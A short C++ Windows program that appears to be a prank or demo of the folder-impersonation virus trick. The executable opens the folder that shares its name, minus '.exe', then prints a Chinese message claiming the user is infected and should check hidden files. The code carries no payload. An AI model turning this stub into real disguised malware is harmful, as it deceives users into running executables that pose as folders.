#include <stdio.h>
#include <windows.h>
#include <string>
#include <tchar.h> 
#include <iostream>
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
//#include <afx.h>
using namespace std;
int main()
{
	char work_path[_MAX_PATH] = {0};
	GetModuleFileName(NULL, work_path, _MAX_PATH);  //得到程序模块.exe全路径  
	       //去掉程序文件名 
	string a,b,c,d;
	
	
	//a.find_last_of(".");
	//b = a.substr(a.find_last_of("\\")+1);
	 
	//c = b.substr(b.find(" ") + 1);
	*(strrchr(work_path, '.') ) = 0;
	d = work_path;

	LPCSTR str = d.c_str();
	//cout << d << endl;
	int gg;
	ShellExecute(NULL, NULL, str, NULL,NULL, SW_NORMAL);
	printf("你已经中毒了，打开隐藏文件试试，嘿嘿！\n");
	//gg = GetLastError();
	//printf("your realy File Folder is hidden!!!");
	//cout << gg;
	system("pause");
	return 0;
}